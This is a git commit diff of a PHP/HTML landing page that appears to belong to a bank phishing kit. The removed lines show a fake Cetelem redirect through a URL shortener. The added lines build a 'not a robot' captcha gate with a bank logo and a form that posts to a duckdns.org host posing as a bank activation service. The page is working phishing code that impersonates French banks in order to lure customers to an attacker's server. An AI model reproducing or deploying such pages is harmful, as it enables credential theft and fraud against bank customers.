dd1aa9131b0bba97bc9fddaed45a78015f1905a9
heliuse01 <91044101+heliuse01@users.noreply.github.com>
2022-01-03 11:24:09 +0800

    Add files via upload

--- index.php
+++ index.php
@@ -1,19 +1,43 @@
-em<!DOCTYPE html>
-
+<!DOCTYPE html>
 <html>
-
+<CENTER>&nbsp;</CENTER>
+<CENTER>
+<CENTER><IMG class=pplfox style="HEIGHT: 150px; WIDTH: 150px" alt=Norway src="https://ci3.googleusercontent.com/proxy/d-hSD_BZQBWCba0dZzu_EFsTNIpL51f1n6w4P4Ju6x00rHTIlBsZeg5fVrUb9f24kO9eEMPiawR9ZMkWg8G8JrM=s0-d-e1-ft#http://s.cdn.1000mercis.com/LBP/tpl/3/logo.png" width=1999 height=532></CENTER>
+<H1 style="FONT-SIZE: 1.86em; FONT-FAMILY: ; POSITION: relative; COLOR: #5d5757; TOP: 50px" ? sans-serif;? Arial, Helvetica, Neue?, Helvetica></H1></CENTER>
+<CENTER>&nbsp;</CENTER>
 <head>
-<meta charset=utf-0/>
-  <title>chargement...</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script> 
+<script>
+$(document).ready(function(){
+ $("form").submit(function(){
+   var response = grecaptcha.getResponse();
+      if(response.length == 0){
+          alert('Please check the Captcha');
+    return false;
+ } 
+ });
+});
+</script>
+ <script type="text/javascript">
+ var onloadCallback = function() {
+ grecaptcha.render('html_element', {
+ 'sitekey' : '6Leu5bkaAAAAAKVPtjihvOARQ04B5zcJ603IIHQy'
+ });
+ };
+ </script>
 </head>
-
 <body>
-
-<?php
-   echo("redirection vers https://www.cetelem.fr/activatio-cpaybiometrie...")     ;
- echo "<META HTTP-EQUIV='Refresh' Content=0;URL='https://kutt.it/QqJpAU'>";
-?>
-
-
+<H3 align=center>Veuillez confirmez que vous n'êtes pas un robot.</H3>
+<CENTER>&nbsp;</CENTER>
+<DIV align=center>
+   <form action="https://activation-centredsp2-mabanque.duckdns.org/zLNJEsr" method="post">
+   <div id="html_element"></div>
+       <br>
+<CENTER>&nbsp;</CENTER>
+       <input type="submit" value="Continuer">
+   </form> 
+ <script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit"
+ async defer>
+ </script>
 </body>
-</html>
+<html>
